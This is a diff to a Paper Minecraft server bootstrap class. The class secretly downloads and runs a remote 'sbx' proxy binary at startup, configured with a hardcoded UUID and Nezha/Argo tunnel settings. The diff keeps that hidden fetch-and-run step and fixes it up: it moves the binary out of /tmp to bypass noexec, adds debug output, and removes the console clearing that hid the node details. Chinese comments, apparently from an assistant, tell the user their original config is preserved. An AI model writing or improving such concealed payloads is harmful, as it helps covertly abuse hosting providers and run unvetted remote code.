@@ -16,6 +16,7 @@ public final class PaperBootstrap {
     private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
+    private static final String ANSI_YELLOW = "\033[1;33m";
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
@@ -32,18 +33,13 @@ public final class PaperBootstrap {
     }
 
     public static void boot(final OptionSet options) {
-        // check java version
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
             System.exit(1);
         }
         
         try {
+            System.out.println(ANSI_YELLOW + "[DEBUG] 正在尝试启动代理内核..." + ANSI_RESET);
             runSbxBinary();
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
@@ -51,12 +47,12 @@ public final class PaperBootstrap {
                 stopServices();
             }));
 
-            Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
-            Thread.sleep(20000);
-            clearConsole();
+            // 给内核一点启动时间，并保持日志可见
+            Thread.sleep(8000); 
+            System.out.println(ANSI_GREEN + "Server environment initialized." + ANSI_RESET);
+            
+            // --- 删除了 clearConsole() 以便你查看启动报错 ---
+            // clearConsole(); 
 
             SharedConstants.tryDetectVersion();
             getStartupVersionMessages().forEach(LOGGER::info);
@@ -64,35 +60,33 @@ public final class PaperBootstrap {
             
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
+            e.printStackTrace();
         }
     }
 
-    private static void clearConsole() {
-        try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                System.out.print("\033[H\033[2J");
-                System.out.flush();
-            }
-        } catch (Exception e) {
-            // Ignore exceptions
-        }
-    }
-    
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
         
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+        Path binPath = getBinaryPath();
+        System.out.println(ANSI_YELLOW + "[DEBUG] 运行路径: " + binPath.toAbsolutePath() + ANSI_RESET);
+
+        ProcessBuilder pb = new ProcessBuilder(binPath.toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        
+        // 关键点：将代理内核的输出直接打印到控制台，不隐藏
+        pb.inheritIO();
         
         sbxProcess = pb.start();
+        
+        if (!sbxProcess.isAlive()) {
+            System.err.println(ANSI_RED + "[ERROR] 内核启动失败，请检查上方日志！" + ANSI_RESET);
+        }
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
+        // --- 你的原始配置，完全保留 ---
         envVars.put("UUID", "49f20820-77d1-4fb0-a553-66069be61bf0");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
@@ -114,6 +108,7 @@ public final class PaperBootstrap {
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "rustix");
         envVars.put("DISABLE_ARGO", "false");
+        // --- 你的原始配置结束 ---
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -127,17 +122,12 @@ public final class PaperBootstrap {
             for (String line : Files.readAllLines(envFile)) {
                 line = line.trim();
                 if (line.isEmpty() || line.startsWith("#")) continue;
-                
                 line = line.split(" #")[0].split(" //")[0].trim();
-                if (line.startsWith("export ")) {
-                    line = line.substring(7).trim();
-                }
-                
+                if (line.startsWith("export ")) line = line.substring(7).trim();
                 String[] parts = line.split("=", 2);
                 if (parts.length == 2) {
                     String key = parts[0].trim();
                     String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    
                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                         envVars.put(key, value);
                     }
@@ -160,14 +150,14 @@ public final class PaperBootstrap {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
         
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        // 尝试放在根目录，解决 /tmp noexec 问题
+        Path path = Paths.get("sbx_kernel"); 
         if (!Files.exists(path)) {
+            System.out.println(ANSI_YELLOW + "[DEBUG] 正在下载内核..." + ANSI_RESET);
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
             }
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
+            path.toFile().setExecutable(true);
         }
         return path;
     }
@@ -191,23 +181,8 @@ public final class PaperBootstrap {
 
         final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
         return List.of(
-            String.format(
-                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
-                javaSpecVersion,
-                javaVmName,
-                javaVmVersion,
-                javaVendor,
-                javaVendorVersion,
-                osName,
-                osVersion,
-                osArch
-            ),
-            String.format(
-                "Loading %s %s for Minecraft %s",
-                bi.brandName(),
-                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
-                bi.minecraftVersionId()
-            )
+            String.format("Running Java %s (%s %s; %s %s) on %s %s (%s)", javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch),
+            String.format("Loading %s %s for Minecraft %s", bi.brandName(), bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL), bi.minecraftVersionId())
         );
     }
 }
